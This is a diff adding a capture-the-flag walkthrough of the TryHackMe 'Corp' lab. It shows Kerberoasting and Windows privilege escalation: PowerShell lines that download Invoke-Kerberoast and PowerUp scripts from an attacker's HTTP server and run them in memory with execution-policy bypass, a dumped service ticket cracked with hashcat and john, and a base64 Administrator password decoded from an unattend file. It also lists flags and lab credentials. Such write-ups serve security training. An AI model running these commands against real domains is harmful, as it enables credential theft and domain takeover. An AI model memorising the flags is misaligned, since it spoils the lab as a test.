@@ -1,0 +1,132 @@
+#Task 2 Bypassing Applocker 
+Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Access the file and and obtain the flag.
+flag{a12a41b5f8111327690f836e9b302f0b}
+
+#Task 3 Kerberoasting 
+setspn -T medin -Q ​ */*
+
+- Running that command, we find an existing SPN. What user is that for?
+hint: setspn -T medin -Q */*
+fela
+
+Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
+Lets first get the Powershell Invoke-Kerberoast script.
+iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
+Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl
+You should get a SPN ticket.
+
+Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.
+hashcat -m 13100 -​a 0 hash.txt wordlist --force
+
+- Crack the hash. What is the users password in plain text?
+hint:
+on my machine
+python3 -m http.server
+
+on target machine: Download file Invoke-Kerberoast.ps1
+c:\Users\dark\powershell
+PS C:\Users\dark\Invoke-WebRequest -Uri http://10.6.88.227:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
+
+OR
+c:\Users\dark\powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.88.227:8000/Invoke-Kerberoast.ps1,'Invoke-Kerberoast.ps1')"
+
+OR download to Run
+c:\User\dark\powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘http://10.6.88.227:8000/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$3B43DA1B765D10404F0129A84957451A$7067AB1ADDED74ED289AD58
+                       00C6A4A9C038B66DAC483C5E68A05409B956B011C90FA45306E91C2ED3D59A980DB5D2DE8E71C15993B65463B7AB5581
+                       9FB448C46529FB45D8EECFC15099FAA691C5DF16242222DD57B6B1B747CE1F55217E2ED7A6CA0E9E5E68E9597C4986CE
+                       581CCD0B1976212F7A4E12972168BF47BDBB0E81CA77CDE39855CE015202ACF8F1661C69395DF7AF5C3EF2840F540B55
+                       37AD0465A0C1C4E29EF3B3EA90EE8CDD24E422C1B16C72FE3FF7CB00CCC5C0E6C1E766F075F4715C86412DDC6E728E0C
+                       048EA94E301F02E30E940C6044EF24725A635A2ABD6A571AADCDF877DAD96D665BBE8141339B318E1FEA1A785324049D
+                       EAF0BB4887561013FA2760F52EDF48631F9843DA00805EE2FDE81A81829B20B9074B90BED6882E972F189EAA3C3BBFF1
+                       E517DB1C6F42ABF5998D1422A431E8322E0694DD14B2D3E19D8081FD9AE348B0B6BBDC0BDF9C8CEA8E2966E009650C14
+                       83CEB3A901DB77791E70B3FD37D71DBC560465718DF42670E7741E539EAEFB17EE4802D87E92C5F0FDBCACD2555326AD
+                       1D5738D6C22EB1B20E3D57492A2A1310C87706BA5279276268961376F97D114498E95E3A608853A7934168B67268E7E8
+                       F04D0F4109BC7E020D612F62D4C78D705B7EFBBAA6BD63B44940F33BD5FCB6FC0455B3E23EC2A665C9B95C125473F69A
+                       9ADF1226A2D495B5D530415440206D8CC0A1E23096E7AAD20CC07B5BE87F4A77867A5A0CAB32D131B6E62356DB2615A1
+                       DF39A9F7A04B7C824827D31C8BEBB0A6B8478E47191920AD78264BB9C0D49EE18F17A12C5F1521E900BFE244FBFB592A
+                       22DBAF5688D17BA7B55C097616930DFBDAB62B6516BE41347E56A828C56469F5E6AEE89CDE3125332CF2FC531602C708
+                       C7A8E25DDB1063F63033ACFE1AEE2D5A6FCFAA72553ABC17696C7632945CD13AB39BAC6BC23C53546E66E5A6B9DA4B0A
+                       60B2A09F11D2D3C9172EDECC8FF2E4133B6047BA7A5170E65188B34AE1D6B662D33416C2EAF13B49FDCF8D843B8F6002
+                       DF67A99B34C13CCB95EE6C54EDBA85B9EB6505F461DF5212C2AAF6ADBBB8DAD5A2DCAFBA7D5B4080694582DCAA06F4F5
+                       BB6BC21B5167DEAE9389248763058E4E37BFC50F27539D7F4A7561C08E5F002430B35047BCE5C0E502B07E571499FA0F
+                       CD34E011609B0214E3B1B395495358F08074CB47456C498317539309D69BCC6E09CEDC006A771E732A4D5D22BF0B5755
+                       36A97E00B6F4D4DC95BC301C10CA4F846FD3C9F9130881D0D8253243C7FCA56EACEDE795EB8F83E527C206C04459C67B
+                       888D0DA47C639D41B344FD6A7BB2AB30013F8D3415ABBF642E2A01734684F36321FAA9775AC20E9A6360B416FC57FFA5
+                       30352345CC7FED077E2614ECEC0CDEFCBA024F823EE
+SamAccountName       : fela
+DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
+ServicePrincipalName : HTTP/fela
+
+copy Hash --> corp.txt
+
+hashcat -m 13100 -a 0 corp.txt /usr/share/wordlists/rockyou.txt 
+john corp.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+
+OR on my machine
+GetUserSPNs.py corp.local/dark:_QuejVudId6 -dc-ip 10.10.105.92 -request
+Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation 
+--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-10 00:54:40.905204  2019-10-11 10:39:12.562404             
+HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-10 00:54:40.905204  2019-10-11 10:39:12.562404             
+HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-10 00:54:40.905204  2019-10-11 10:39:12.562404             
+
+
+
+$krb5tgs$23$*fela$CORP.LOCAL$corp.local/fela*$53512056427f804041c2d115445819a2$6b87f37d4d691307d50ff08c1a5a47b824a763c6a9d054a7eeef8ca1105b0927689f640ebba36de4d18c4430bc4641a93f99cb8fe8b815994730a9424ab951c517f9c5170ad0efa83d4316d00827045a5b3a0c65fe08a11d1998e65745e4e85603411f4807fa3e2e1b6e562e77f533a124e931ce1734bc273e9a6b17956ce97b87b91236c6b8451bee3baac3cfba9ab4598a824fc9415cb53cdab230ee10f663c883058ea38fcaa59ef622de5ac6f81c9df4863479415b71587d59c024619085b5a61dc3a42971f0c1188ba1eafec3855d434b0da8b338883bc3b8cf6761c7af10b3ff548939c13dc46a4adc3f361a660bc97c5cf5facd8f1ea39a994f80403835d2f3a5a42b582d6a8c254936a80ffd1ea47c9e02cc023baef350b7f96987a67c8a4321ec63e059c96c62f5eef6dcd13d941570ab12b27933e5e303a90d69f87b9f291dfcd74b100d14fd45c1bcb36fe20f28c811e04e5dbe49611af1d6bcfdae78c8dad5a1587dedc827c4e468e4a6d60000d1e0f7512c00ce33e38a0ccf43f71416369579092a53f4b6982a49f4349d4709c8823ca30cbc0fc135746405f2f8db5235d01d4461dd873dce3d175b9359e9739a6f5166310bd5488b0d8d0aef8f85eefc9bf1c8f740aa495528c05db93c988c002881f5bd69eeeb6d4e575ea2d4a7f3db536b8a2b62089aa5199646ca6cb8ebe9a352e31ecb0c632460db57b669103929c0175a94e1b0f6c40e9972b36861fafcc89c42871302a1bf116f708eafc863cdeac4155a3f1361dcc474f9a8bd55f4975d220161a8d1328d20840af01eb6c8a7c9e718d783a6a2b5da0c4a35897741f8884d12502c94cd87a04f7239a169d0e7d8621a657e3325ad59d84f488e7ff95402a3be73b3df7791b28e84f85caf39737e72553352101cc44373b5d3bf65874ee34c8beb610f526a621e5496384b4f4109afe7b0a0e762f4ca300fcf41d1a740f7a704aa790bb86a2dd0cbfa6cba6a0bcf6e1cda1870bb397c6344e87fa61edb5f89bdc8c0f483ce0647f6a0a60200ea8ea2634b417679d0b0a8dc880df73256ed7b3e7a1d05b2734c0e3510c77325e9817d57a9095df8750ae068b5741b912ea822feab6211f4db18f8773334a6ba7be976807682445b4c41563f22090002ada35efe13ba71f0d185436b60bea668c42e06d9fe97ba91baf383dd15c5cd710d34b3017993620e8bf35ef5d48336c30f23ce324dae22c489293de7a2b374a4386a5e05
+
+
+
+hashcat -m 13100 -a 0 corp.txt /usr/share/wordlists/rockyou.txt 
+john corp.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+rubenF124
+
+
+- Login as this user. What is his flag?
+hint: runas /noprofile /user:corp.local\fela cmd
+
+more c:\Users\fela.CORP\Desktop\flag.txt
+flag{bde1642535aa396d2439d86fe54a36e4}
+
+
+#Task 4 Privilege Escalation 
+- What is the decoded password?
+hint: Download file PowerUp.ps1
+PS C:\Invoke-WebRequest -Uri http://10.6.88.227:8000/PowerUp.ps1 -OutFile Invoke-PowerUp.ps1
+. .\PowerUp.ps1
+
+or
+c:\users\dark\powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.88.227:8000/PowerUp.ps1','PowerUp.ps1')"
+. .\PowerUp.ps1
+
+or download to RUN
+c:\users\dark\powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘http://10.6.88.227:8000/PowerUp.ps1');Invoke-AllChecks -erroraction silentlycontinue -OutputFormat powerup
+
+
+more C:\Windows\Panther\Unattend\Unattended.xml
+<AutoLogon>
+    <Password>
+        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
+        <PlainText>false</PlainText>
+    </Password>
+    <Enabled>true</Enabled>
+    <Username>Administrator</Username>
+</AutoLogon>
+
+copy dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
+save h.txt
+cat h.txt| base64 -d
+tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T 
+
+
+
+https://www.aldeid.com/wiki/TryHackMe-Corp
+https://cd6629.gitbook.io/ctfwriteups/windows-privesc/corp-w-wlk
+https://executeatwill.com/2020/04/20/TryHackMe-Corp-Walkthrough/
+https://steflan-security.com/tryhackme-corp-walkthrough/?utm_source=rss&utm_medium=rss&utm_campaign=tryhackme-corp-walkthrough
